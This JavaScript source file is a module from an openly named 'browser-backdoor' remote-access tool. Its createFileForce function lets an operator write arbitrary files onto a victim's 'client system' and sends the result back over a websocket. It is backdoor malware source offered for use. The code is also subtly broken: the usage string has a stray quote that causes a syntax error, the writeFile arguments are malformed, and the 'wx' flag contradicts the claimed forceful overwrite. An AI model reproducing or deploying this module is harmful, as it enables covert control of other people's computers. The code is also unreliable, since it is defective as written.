// INTERACTIVE
/**
 * @file createFileForce Module
 * @summary Create a file (forcefully) with specific contents on the client system.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

fs = require('original-fs');

/**
 * @param {String} fullPath - The full path of the file to create.
 * @param {String} data - The data to write to the file.
 * @param {String} encoding - The encoding type of the data.
 * @return {String} |error|
 * @return {String} "File created"
 */
createFileForce = function (fullPath, data, encoding) {
    fs.writeFile(fullPath, data, encoding, { flag: "wx" }, function(err) {
        if (err) {
            ws.send("Error creating file: " + err.toString());
        } else {
            ws.send("Created " + fullPath);
        }
    }); 
}

ws.send("\nUsage: createFileForce(fullPath, data, encoding)\n- fullPath is the properly escaped full path of the file.\n- data is the text to write to the file.\n- encoding is a string of the encoding type of the data. E.g. \"utf8\"."");
